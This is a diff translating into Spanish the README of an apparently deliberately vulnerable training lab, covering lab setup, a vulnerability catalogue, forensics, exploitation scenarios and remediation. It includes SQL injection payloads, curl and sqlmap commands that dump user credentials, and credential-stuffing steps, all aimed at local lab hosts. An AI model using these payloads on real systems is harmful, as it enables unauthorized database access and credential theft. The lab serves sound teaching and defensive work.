@@ -1,63 +1,68 @@
-# TechSolutions S.A. - Security Lab & Honeypot
+# TechSolutions S.A. - Laboratorio de Seguridad y Honeypot
 
-🔒 **Educational Security Lab** - A simulated vulnerable environment for cybersecurity training and forensic analysis.
+**Laboratorio Educacional de Seguridad** - Un entorno vulnerable simulado para entrenamiento en ciberseguridad y análisis forense.
 
-## 📋 Table of Contents
+## Tabla de Contenidos
 
-- [Overview](#overview)
-- [Lab Setup](#lab-setup)
-- [Architecture](#architecture)
-- [Vulnerabilities Catalog](#vulnerabilities-catalog)
-- [Forensic Analysis Guide](#forensic-analysis-guide)
-- [Exploitation Scenarios](#exploitation-scenarios)
-- [Remediation](#remediation)
+- [Descripción General](#descripción-general)
+- [Configuración del Laboratorio](#configuración-del-laboratorio)
+- [Arquitectura](#arquitectura)
+- [Catálogo de Vulnerabilidades](#catálogo-de-vulnerabilidades)
+- [Guía de Análisis Forense](#guía-de-análisis-forense)
+- [Escenarios de Explotación](#escenarios-de-explotación)
+- [Remediación](#remediación)
+- [Objetivos de Aprendizaje](#objetivos-de-aprendizaje)
+- [Descargo Legal](#descargo-legal)
+- [Contribuciones](#contribuciones)
+- [Licencia](#licencia)
+- [Recursos](#recursos)
 
-## 🎯 Overview
+## Descripción General
 
-TechSolutions S.A. is a simulated medium-sized software company with a deliberately vulnerable infrastructure for security training purposes. This lab contains **5 critical security issues** commonly found in real-world environments:
+TechSolutions S.A. es una empresa de software mediana simulada con una infraestructura deliberadamente vulnerable para propósitos de entrenamiento en seguridad. Este laboratorio contiene **5 problemas críticos de seguridad** comúnmente encontrados en entornos del mundo real:
 
-1. **Public S3 Bucket** - Exposed database backups
-2. **SQL Injection** - Vulnerable login form
-3. **Compromised Credentials** - Leaked admin access
-4. **Ransomware Attack** - Encrypted servers with forensic artifacts
-5. **Data Leaks** - Client information on dark web forums
+1. **Bucket S3 Público** - Backups de base de datos expuestos
+2. **Inyección SQL** - Formulario de login vulnerable
+3. **Credenciales Comprometidas** - Acceso de administrador filtrado
+4. **Ataque de Ransomware** - Servidores cifrados con artefactos forenses
+5. **Filtración de Datos** - Información de clientes en foros de la web oscura
 
-## 🚀 Lab Setup
+## Configuración del Laboratorio
 
-### Prerequisites
+### Prerrequisitos
 
-- Docker & Docker Compose installed
-- Node.js 18+ and npm
+- Docker y Docker Compose instalados
+- Node.js 18+ y npm
 - Git
-- At least 2GB RAM available
-- Basic understanding of networking and cybersecurity
+- Al menos 2GB de RAM disponible
+- Conocimiento básico de redes y ciberseguridad
 
-### Quick Start
+### Inicio Rápido
 
 ```bash
-# Clone the repository
+# Clonar el repositorio
 git clone https://github.com/yourusername/techsolutions-lab.git
 cd techsolutions-lab
 
-# Start the lab environment
+# Iniciar el entorno del laboratorio
 docker-compose up -d
 
-# Initialize the database
+# Inicializar la base de datos
 npm run init-db
 
-# Start the vulnerable web application
-npm run dev
+# La aplicación web vulnerable ya está ejecutándose
+# Acceder en: http://techsolutions.com.test:3000
 ```
 
-### Accessing the Lab
+### Acceder al Laboratorio
 
-- **Web Application**: http://techsolutions.com.test:3000
-- **Database**: localhost:3306 (user: `root`, password: `vulnerable123`)
-- **S3 Bucket (simulated)**: `./s3-bucket/` directory
+- **Aplicación Web**: http://techsolutions.com.test:3000
+- **Base de Datos**: localhost:3306 (usuario: `root`, contraseña: `vulnerable123`)
+- **Bucket S3 (simulado)**: directorio `./s3-bucket/`
 
-### DNS Configuration
+### Configuración DNS
 
-Add the following to your `/etc/hosts` file:
+Agregar lo siguiente al archivo `/etc/hosts`:
 
 ```
 127.0.0.1   techsolutions.com.test
@@ -65,9 +70,9 @@ Add the following to your `/etc/hosts` file:
 127.0.0.1   admin.techsolutions.com.test
 ```
 
-On Windows, edit `C:\Windows\System32\drivers\etc\hosts`
+En Windows, editar `C:\Windows\System32\drivers\etc\hosts`
 
-## 🏗️ Architecture
+## Arquitectura
 
 ```
 ┌─────────────────────────────────────────────────────────┐
@@ -90,91 +95,91 @@ On Windows, edit `C:\Windows\System32\drivers\etc\hosts`
 └─────────────────────────────────────────────────────────┘
 ```
 
-## 🐛 Vulnerabilities Catalog
+## Catálogo de Vulnerabilidades
 
-### 1. Public S3 Bucket (High Severity)
+### 1. Bucket S3 Público (Severidad Alta)
 
-**Location**: `s3-bucket/backups/`
+**Ubicación**: `s3-bucket/backups/`
 
-**Description**: Database backup files are publicly accessible without authentication.
+**Descripción**: Los archivos de backup de la base de datos son públicamente accesibles sin autenticación.
 
-**Files Exposed**:
-- `db_backup_2025-10-15.sql` - Complete database dump
-- `customer_data_export.csv` - Customer PII
-- `payment_records.json` - Payment information
-- `credentials.txt` - Hardcoded credentials
+**Archivos Expuestos**:
+- `db_backup_2025-10-15.sql` - Volcado completo de la base de datos
+- `customer_data_export.csv` - PII de clientes
+- `payment_records.json` - Información de pagos
+- `credentials.txt` - Credenciales hardcodeadas
 
-**Risk**: Complete data breach, regulatory violations (GDPR, PCI-DSS)
+**Riesgo**: Brecha completa de datos, violaciones regulatorias (GDPR, PCI-DSS)
 
-### 2. SQL Injection (Critical Severity)
+### 2. Inyección SQL (Severidad Crítica)
 
-**Location**: POST `/api/login`
+**Ubicación**: POST `/api/auth/login`
 
-**Vulnerable Code**: `src/routes/auth.ts`
+**Código Vulnerable**: `src/routes/auth.ts`
 
-**Payload Examples**:
+**Ejemplos de Payload**:
 ```sql
-# Basic boolean-based injection
+# Inyección booleana básica
 Username: admin' OR 1=1-- 
 Password: anything
 
-# Comment-based injection
+# Inyección basada en comentarios
 Username: admin'-- 
 Password: (empty)
 
-# Union-based injection
+# Inyección basada en UNION
 Username: ' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- 
 Password: (empty)
 
-# Alternative boolean injection
+# Inyección booleana alternativa
 Username: admin' OR 'x'='x
 Password: anything
 ```
 
-**Risk**: Full database extraction, authentication bypass, data manipulation
+**Riesgo**: Extracción completa de la base de datos, elusión de autenticación, manipulación de datos
 
 ### 3. Compromised Administrator Credentials
 
-**Leaked Credentials**:
+**Credenciales Filtradas**:
 - Username: `carlos.admin@techsolutions.com`
 - Password: `TechSol2024!Admin`
 - Found in: External breach database (simulated in `s3-bucket/breaches/`)
 
 **Access Level**: Full administrative privileges
 
-**Risk**: Unauthorized access, privilege escalation, lateral movement
+**Riesgo**: Acceso no autorizado, escalación de privilegios, movimiento lateral
 
 ### 4. Ransomware Attack
 
-**Affected Files**: `ransomware/encrypted/`
+**Archivos Afectados**: `ransomware/encrypted/`
 
-**Indicators**:
+**Indicadores**:
 - File extension: `.locked`
 - Ransom note: `README_DECRYPT.txt`
 - Encryption timestamp: 2025-10-27 03:00:00 UTC
 - Entry vector: Phishing email with malicious attachment
 
-**Forensic Artifacts**:
+**Artefactos Forenses**:
 - Initial access logs in `logs/AUTH_2025-10-27T10:01:32.log`
 - Network connections in `logs/NET_2025-10-27T03:14:55.log`
 - Process execution traces
 - Registry modifications (simulated)
 
-**Risk**: Business disruption, data loss, ransom payment
+**Riesgo**: Interrupción del negocio, pérdida de datos, pago de rescate
 
 ### 5. Data Leaks on Dark Web Forums
 
-**Location**: `dark-web-leaks/forum_posts.txt`
+**Ubicación**: `dark-web-leaks/forum_posts.txt`
 
-**Leaked Information**:
+**Información Filtrada**:
 - 1,247 customer records
 - Credit card numbers (last 4 digits)
 - Email addresses and phone numbers
 - Internal employee data
 
-**Origin**: Combination of S3 bucket exposure and SQL injection exploitation
+**Origen**: Combinación de exposición de bucket S3 y explotación de inyección SQL
 
-## 🔍 Forensic Analysis Guide
+## Guía de Análisis Forense
 
 ### Step 1: Initial Triage
 
@@ -351,22 +356,22 @@ npm run generate-timeline
 2025-10-28 15:00:00 - Data Leak: Customer data posted on dark web forum
 ```
 
-## 🎮 Exploitation Scenarios
+## Escenarios de Explotación
 
-### Scenario 1: SQL Injection Attack
+### Escenario 1: Ataque de Inyección SQL
 
-**Objective**: Extract all user credentials from the database
+**Objetivo**: Extraer todas las credenciales de usuario de la base de datos
 
-**Steps**:
+**Pasos**:
 
-1. **Identify the injection point**:
+1. **Identificar el punto de inyección**:
 ```bash
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"test","password":"test"}'
 ```
 
-2. **Test for SQL injection**:
+2. **Probar inyección SQL**:
 ```bash
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
@@ -380,22 +385,22 @@ Invoke-WebRequest -Uri "http://techsolutions.com.test:3000/api/auth/login" `
   -Method POST -ContentType "application/json" -InFile "payload.json"
 ```
 
-3. **Extract database structure**:
+3. **Extraer estructura de la base de datos**:
 ```bash
-# Get table names
+# Obtener nombres de tablas
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"'\'' UNION SELECT 1,table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- ","password":""}'
 ```
 
-4. **Dump user credentials**:
+4. **Volcar credenciales de usuario**:
 ```bash
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"'\'' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- ","password":""}'
 ```
 
-5. **Automate with SQLMap**:
+5. **Automatizar con SQLMap**:
 ```bash
 sqlmap -u "http://techsolutions.com.test:3000/api/login" \
   --data='{"username":"test","password":"test"}' \
@@ -404,162 +409,162 @@ sqlmap -u "http://techsolutions.com.test:3000/api/login" \
   --dump
 ```
 
-### Scenario 2: S3 Bucket Exploitation
+### Escenario 2: Explotación de Bucket S3
 
-**Objective**: Access and download sensitive backup files
+**Objetivo**: Acceder y descargar archivos de respaldo sensibles
 
-**Steps**:
+**Pasos**:
 
-1. **List bucket contents**:
+1. **Listar contenido del bucket**:
 ```bash
 ls -la s3-bucket/backups/
 ```
 
-2. **Download database backup**:
+2. **Descargar respaldo de base de datos**:
 ```bash
 cp s3-bucket/backups/db_backup_2025-10-15.sql ./
 ```
 
-3. **Extract credentials**:
+3. **Extraer credenciales**:
 ```bash
 grep -i "password\|secret\|key" db_backup_2025-10-15.sql
 ```
 
-4. **Analyze customer data**:
+4. **Analizar datos de clientes**:
 ```bash
 cat s3-bucket/backups/customer_data_export.csv | wc -l
 head -20 s3-bucket/backups/customer_data_export.csv
 ```
 
-### Scenario 3: Credential Stuffing Attack
+### Escenario 3: Ataque de Reutilización de Credenciales
 
-**Objective**: Use compromised credentials for unauthorized access
+**Objetivo**: Usar credenciales comprometidas para acceso no autorizado
 
-**Steps**:
+**Pasos**:
 
-1. **Obtain leaked credentials**:
+1. **Obtener credenciales filtradas**:
 ```bash
 cat s3-bucket/breaches/external_breach.txt | grep "techsolutions.com"
 ```
 
-2. **Test credentials**:
+2. **Probar credenciales**:
 ```bash
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"carlos.admin@techsolutions.com","password":"TechSol2024!Admin"}'
 ```
 
-3. **Access admin panel**:
+3. **Acceder al panel de administración**:
 ```bash
-# Use obtained session token
+# Usar token de sesión obtenido
 curl -X GET http://techsolutions.com.test:3000/api/admin/users \
   -H "Authorization: Bearer <token_from_step_2>"
 ```
 
-### Scenario 4: Ransomware Forensics
+### Escenario 4: Análisis Forense de Ransomware
 
-**Objective**: Analyze ransomware behavior and identify IOCs
+**Objetivo**: Analizar el comportamiento del ransomware e identificar IOCs
 
-**Steps**:
+**Pasos**:
 
-1. **Examine ransom note**:
+1. **Examinar nota de rescate**:
 ```bash
 cat ransomware/README_DECRYPT.txt
 ```
 
-2. **Identify encrypted files**:
+2. **Identificar archivos cifrados**:
 ```bash
 find ransomware/encrypted/ -name "*.locked" -exec file {} \;
 ```
 
-3. **Extract encryption metadata**:
+3. **Extraer metadatos de cifrado**:
 ```bash
 npm run analyze-ransomware
 ```
 
-4. **Search for IOCs**:
+4. **Buscar IOCs**:
 ```bash
-# File hashes
+# Hashes de archivos
 md5sum ransomware/dropper/Invoice_Q3_2025.pdf.exe
 
-# Network indicators
+# Indicadores de red
 grep -E "C2|command|control" logs/NET_*.log
 ```
 
-5. **Attempt recovery**:
+5. **Intentar recuperación**:
 ```bash
-# Note: In real scenarios, recovery depends on ransomware variant
+# Nota: En escenarios reales, la recuperación depende de la variante de ransomware
 npm run simulate-recovery
 ```
 
-## 🛡️ Remediation
+## Remediación
 
-### Fix 1: Secure S3 Bucket
+### Solución 1: Asegurar Bucket S3
 
 ```bash
-# In production AWS:
+# En AWS de producción:
 aws s3api put-bucket-acl --bucket techsolutions-backups --acl private
 aws s3api put-public-access-block --bucket techsolutions-backups \
   --public-access-block-configuration \
   "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
 ```
 
-### Fix 2: Patch SQL Injection
+### Solución 2: Parchear Inyección SQL
 
-See `src/routes/auth.secure.ts` for the patched version using parameterized queries.
+Ver `src/routes/auth.secure.ts` para la versión parcheada usando consultas parametrizadas.
 
-### Fix 3: Reset Compromised Credentials
+### Solución 3: Restablecer Credenciales Comprometidas
 
 ```sql
--- Revoke compromised admin access
+-- Revocar acceso de administrador comprometido
 UPDATE users SET password = SHA2('NewSecurePassword123!', 256), 
                  force_password_change = 1 
 WHERE username = 'carlos.admin@techsolutions.com';
 
--- Enable MFA for all admin accounts
+-- Habilitar MFA para todas las cuentas de administrador
 UPDATE users SET mfa_enabled = 1 WHERE role = 'admin';
 ```
 
-### Fix 4: Ransomware Prevention
+### Solución 4: Prevención de Ransomware
 
-- Implement email filtering and sandboxing
-- Deploy EDR solution
-- Regular offline backups (3-2-1 rule)
-- Network segmentation
-- Application whitelisting
+- Implementar filtrado de email y sandboxing
+- Desplegar solución EDR
+- Respaldos offline regulares (regla 3-2-1)
+- Segmentación de red
+- Lista blanca de aplicaciones
 
-### Fix 5: Data Leak Response
+### Solución 5: Respuesta a Filtración de Datos
 
-- Notify affected customers (GDPR requirement)
-- Offer credit monitoring services
-- Report to data protection authority
-- Conduct security audit
-- Implement DLP solution
+- Notificar a clientes afectados (requerimiento GDPR)
+- Ofrecer servicios de monitoreo de crédito
+- Reportar a la autoridad de protección de datos
+- Realizar auditoría de seguridad
+- Implementar solución DLP
 
-## 📚 Learning Objectives
+## Objetivos de Aprendizaje
 
-After completing this lab, you should be able to:
+Después de completar este laboratorio, deberías poder:
 
-- ✅ Identify and exploit common web application vulnerabilities
-- ✅ Perform forensic analysis on compromised systems
-- ✅ Correlate multiple data sources to build attack timelines
-- ✅ Understand the kill chain of a multi-stage attack
-- ✅ Implement security controls and remediation strategies
-- ✅ Write comprehensive incident response reports
+- Identificar y explotar vulnerabilidades comunes de aplicaciones web
+- Realizar análisis forense en sistemas comprometidos
+- Correlacionar múltiples fuentes de datos para construir líneas de tiempo de ataques
+- Entender la cadena de muerte de un ataque multi-etapa
+- Implementar controles de seguridad y estrategias de remediación
+- Escribir reportes integrales de respuesta a incidentes
 
-## ⚠️ Legal Disclaimer
+## Descargo Legal
 
-This lab is for **EDUCATIONAL PURPOSES ONLY**. Do not use these techniques against systems you do not own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law.
+Este laboratorio es **SOLO PARA PROPÓSITOS EDUCACIONALES**. No uses estas técnicas contra sistemas que no posees o para los que no tienes permiso explícito para probar. El acceso no autorizado a sistemas informáticos es ilegal y punible por ley.
 
-## 🤝 Contributing
+## Contribuciones
 
-Contributions are welcome! Please feel free to submit pull requests to add new scenarios or improve existing ones.
+¡Las contribuciones son bienvenidas! Por favor, siéntete libre de enviar pull requests para agregar nuevos escenarios o mejorar los existentes.
 
-## 📝 License
+## Licencia
 
-MIT License - See LICENSE file for details
+Licencia MIT - Ver archivo LICENSE para detalles
 
-## 🔗 Resources
+## Recursos
 
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [MITRE ATT&CK Framework](https://attack.mitre.org/)
@@ -568,4 +573,4 @@ MIT License - See LICENSE file for details
 
 ---
 
-**Created for educational purposes by the cybersecurity community** 🛡️
+**Creado con propósitos educacionales por la comunidad de ciberseguridad**
